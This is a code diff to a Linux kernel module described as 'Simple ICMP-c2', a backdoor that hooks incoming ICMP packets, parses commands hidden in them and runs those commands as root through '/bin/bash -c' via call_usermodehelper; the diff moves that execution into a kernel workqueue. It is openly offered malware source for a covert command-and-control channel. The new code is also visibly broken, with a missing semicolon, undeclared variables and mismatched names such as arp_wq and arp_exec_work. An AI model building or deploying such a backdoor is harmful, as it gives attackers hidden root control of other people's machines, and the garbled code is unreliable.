@@ -13,6 +13,7 @@
 #include <linux/inet.h>
 #include <linux/if_ether.h>
 #include <net/ip.h>
+#include <linux/workqueue.h>
 
 #define DEBUG_K
 
@@ -29,6 +30,9 @@ MODULE_DESCRIPTION("Simple ICMP-c2");
 
 static struct socket *raw_socket;
 static struct nf_hook_ops nfho;
+static struct workqueue_struct *work_queue;
+static atomic_t work_count = ATOMIC_INIT(0);
+
 
 typedef enum COMMANDS {
     START_SERVICE = 0,
@@ -37,8 +41,15 @@ typedef enum COMMANDS {
     DANGER        = 4
 } command_t;
 
+struct work_item {
+    struct work_struct work;
+    char *command;
+}
+
+// Work
+static void handle_work();
 // Commands
-static int execute_and_get_status(command_t type, char *argument);
+static int queue_execute(command_t type, char *argument);
 char **split_on_strings(char *string, int *token_count);
 void free_tokens(char **tokens, int token_count);
 int parse_and_run_command(char *raw_input);
@@ -47,12 +58,30 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 static uint16_t checksum(uint16_t *data, int len);
 static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);
 
-
-static int execute_and_get_status(command_t type, char *argument){
-    char command[128] = {0};
+static void handle_work(struct work_struct *work) {
     int ret;
 
-    
+    pr_info("Entering work handler...\n");
+    printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
+    struct arp_work *work_item = container_of(work, struct work_item, work);
+
+    char *argv[] = { "/bin/bash", "-c", work_item->command, NULL };
+    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    #ifdef DEBUG_K
+    if (ret != 0){
+        pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
+    }
+    #endif
+
+    atomic_dec(&work_count);
+}
+
+static int queue_execute(command_t type, char *argument){
+    char *command = kmalloc(128, GFP_KERNEL);
+    memset(command, 0, 128);
+
+
     switch(type){
         case START_SERVICE:
         case STOP_SERVICE:
@@ -80,17 +109,15 @@ static int execute_and_get_status(command_t type, char *argument){
             #endif
             return -1;
     }
-    
-    char *argv[] = { "/bin/bash", "-c", command, NULL };
-    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if (ret != 0){
-        #ifdef DEBUG_K
-            pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
-        #endif
-    }
 
-    return ret;
+    struct work_item *q = kmalloc(sizeof(struct work_item));
+    q->command = command;
+
+    INIT_WORK(&work->work, arp_exec_work);
+    queue_work(arp_wq, &work->work);
+    atomic_inc(&work_count);
+
+    return 0;
 }
 
 char **split_on_strings(char *string, int *token_count){
@@ -159,7 +186,7 @@ int parse_and_run_command(char *raw_input){
     #endif
 
     // Only takes second word rn
-    status = execute_and_get_status(type, argv_in[1]);
+    status = queue_execute(type, argv_in[1]);
 
     free_tokens(argv_in, argc_in);
     return status;
